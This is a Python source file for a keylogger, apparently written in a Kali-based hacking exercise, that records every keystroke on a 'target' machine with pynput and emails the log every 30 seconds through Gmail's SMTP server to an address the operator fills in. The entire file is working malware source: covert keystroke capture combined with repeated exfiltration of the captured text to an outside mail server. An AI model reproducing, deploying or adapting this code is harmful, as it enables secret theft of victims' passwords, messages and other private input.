'''
KEYLOGGER 
: pip install pynput in kali(library for keylogging and mouselogging)
We can connect the kali with the target using sockets and all with beef, but instead of making it complex we can simply mail the logs from target to kali.
'''

import pynput.keyboard							#since we'll be working only with keyboard
import smtplib							
import threading
log =""

def callback_function(key):
	global log							
	try:						
		#log=log+key.char.encode("utf-8")	
		log = log + str(key.char)
	except AttributeError:						
		if key==key.space:						#key.space is defined in pynput			
			log = log + " "					
		else:
			log=log+str(key)
	#print(log)

def send_email(email,passwd,msg):
	email_server=smtplib.SMTP("smtp.gmail.com",587)#here we are tring gmail,can try for others too. Just give the name, and its port. Gmail port=587,hence.			
	email_server.starttls()		#starts gmail						
	email_server.login(email,passwd)   #logs into the account, ovio needs gmail creds				
	email_server.sendmail(email,email,msg) #email_server.sendmail("<senderAddr>", <"receiverAddr>", "<message>")
	email_server.quit()

def thread_function():
	global log 	#since we want to use the same variable(that we defined outside funtion), when called multiple times, also might be used by other functions as well.
	send_email("<emailID>","<passwd>",log)						### **** INSERT YOURS *** ###
	log=""														#clearing logafter sending
	timer_object=threading.Timer(30,thread_function)			#runs the thread_function repeatedly after every 30 secs, but on a different thread.
	timer_object.start()

keylogger_listener=pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:													#with - the same keyword used in file handling in python
	thread_function()						
	keylogger_listener.join()												#to start the listening